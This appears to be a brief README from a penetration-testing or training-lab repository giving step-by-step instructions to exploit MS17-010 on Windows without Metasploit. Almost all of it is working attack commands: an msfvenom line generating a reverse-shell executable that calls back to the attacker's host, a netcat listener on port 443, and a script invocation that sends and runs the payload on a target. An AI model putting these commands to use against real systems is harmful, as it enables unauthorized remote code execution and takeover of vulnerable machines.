# Notes

If we want to attack a machine without metasploit, we can use these scripts.
This also has the upside of allowing us to target x86 systems.
The script is originally python2, which is the reason for the manual handling of mysmb.py.

do:

* `pipenv install impacket`
* generate payload with: `msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010-shell.exe`
* run `nc -nvlp 443`
* execute payload with `pipenv run python send_and_execute.py ${RHOST} ms17-010-shell.exe`
